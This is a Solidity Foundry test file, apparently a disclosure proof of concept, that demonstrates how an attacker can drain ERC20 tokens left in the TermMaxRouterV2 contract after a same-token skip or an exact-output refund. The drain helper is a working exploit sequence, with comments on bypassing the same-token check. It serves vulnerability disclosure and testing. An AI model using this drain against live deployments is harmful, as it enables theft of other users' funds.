// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {RouterTestV2} from "./RouterV2.t.sol";
import {SwapUnit} from "contracts/v1/router/ISwapAdapter.sol";
import {SwapPath} from "contracts/v2/router/ITermMaxRouterV2.sol";
import {TermMaxSwapData} from "contracts/v2/router/swapAdapters/TermMaxSwapAdapter.sol";

/// @notice PoCs for cross-user theft of ERC20 balances stranded in TermMaxRouterV2.
contract RouterBalanceDrainPoC is RouterTestV2 {
    function _drainRouterDebtBalance(address attacker) internal returns (uint256 stolen) {
        stolen = res.debt.balanceOf(address(res.router));
        assertGt(stolen, 0, "precondition: router has no stranded debt token");

        vm.startPrank(attacker);
        SwapUnit[] memory attackerUnits = new SwapUnit[](1);
        attackerUnits[0] = SwapUnit({
            adapter: address(0),
            tokenIn: address(res.debt),
            // tokenOut only needs to differ to bypass the same-token skip.
            // The adapter==0 branch transfers tokenIn, not tokenOut.
            tokenOut: address(res.ft),
            swapData: bytes("")
        });

        SwapPath[] memory attackerPaths = new SwapPath[](1);
        attackerPaths[0] = SwapPath({
            inputAmount: 0,
            recipient: attacker,
            useBalanceOnchain: true,
            units: attackerUnits
        });

        res.router.swapTokens(attackerPaths);
        vm.stopPrank();

        assertEq(res.debt.balanceOf(attacker), stolen, "attacker did not receive stranded funds");
        assertEq(res.debt.balanceOf(address(res.router)), 0, "router balance was not drained");
    }

    function test_PoC_CrossUserDrainAfterSameTokenSkip() public {
        address victim = vm.addr(0xBEEF);
        address attacker = vm.addr(0xCAFE);
        uint256 amount = 1_000e8;

        // The interface explicitly documents tokenIn == tokenOut as a supported
        // skipped unit. The victim uses that documented no-op path.
        res.debt.mint(victim, amount);

        vm.startPrank(victim);
        res.debt.approve(address(res.router), amount);

        SwapUnit[] memory victimUnits = new SwapUnit[](1);
        victimUnits[0] = SwapUnit({
            adapter: address(0),
            tokenIn: address(res.debt),
            tokenOut: address(res.debt),
            swapData: bytes("")
        });

        SwapPath[] memory victimPaths = new SwapPath[](1);
        victimPaths[0] = SwapPath({
            inputAmount: amount,
            recipient: victim,
            useBalanceOnchain: false,
            units: victimUnits
        });

        res.router.swapTokens(victimPaths);
        vm.stopPrank();

        // transferFrom has already pulled the tokens, but the skipped unit does
        // not deliver them to recipient. They become a shared router balance.
        assertEq(res.debt.balanceOf(victim), 0, "victim unexpectedly kept funds");
        assertEq(res.debt.balanceOf(address(res.router)), amount, "funds were not stranded");

        _drainRouterDebtBalance(attacker);
    }

    function test_PoC_CrossUserDrainOfNormalExactOutputRefund() public {
        address victim = vm.addr(0xA11CE);
        address attacker = vm.addr(0xBAD);

        uint128 maximumDebtInput = 100e8;
        uint128 exactFtOutput = 90e8;

        // This is a normal successful exact-output swap through the protocol's
        // own whitelisted TermMaxSwapAdapter. The official router tests use the
        // router itself as refundAddress in internal workflows.
        address[] memory orders = new address[](2);
        orders[0] = address(res.order);
        orders[1] = address(res.order);

        uint128[] memory tradingAmounts = new uint128[](2);
        tradingAmounts[0] = exactFtOutput / 2;
        tradingAmounts[1] = exactFtOutput - tradingAmounts[0];

        TermMaxSwapData memory swapData = TermMaxSwapData({
            swapExactTokenForToken: false,
            scalingFactor: 0,
            orders: orders,
            tradingAmts: tradingAmounts,
            netTokenAmt: maximumDebtInput,
            deadline: block.timestamp + 1 hours,
            refundAddress: address(res.router)
        });

        res.debt.mint(victim, maximumDebtInput);

        vm.startPrank(victim);
        res.debt.approve(address(res.router), maximumDebtInput);

        SwapUnit[] memory victimUnits = new SwapUnit[](1);
        victimUnits[0] = SwapUnit({
            adapter: address(termMaxSwapAdapter),
            tokenIn: address(res.debt),
            tokenOut: address(res.ft),
            swapData: abi.encode(swapData)
        });

        SwapPath[] memory victimPaths = new SwapPath[](1);
        victimPaths[0] = SwapPath({
            inputAmount: maximumDebtInput,
            recipient: victim,
            useBalanceOnchain: false,
            units: victimUnits
        });

        uint256 ftBefore = res.ft.balanceOf(victim);
        uint256[] memory spent = res.router.swapTokens(victimPaths);
        vm.stopPrank();

        assertEq(res.ft.balanceOf(victim) - ftBefore, exactFtOutput, "exact-output swap failed");
        assertLt(spent[0], maximumDebtInput, "test requires a non-zero exact-output refund");

        uint256 refund = maximumDebtInput - spent[0];
        assertEq(res.debt.balanceOf(address(res.router)), refund, "refund was not retained by router");
        assertEq(res.debt.balanceOf(victim), 0, "refund unexpectedly returned to victim");

        uint256 stolen = _drainRouterDebtBalance(attacker);
        assertEq(stolen, refund, "attacker did not steal exact-output refund");
    }
}
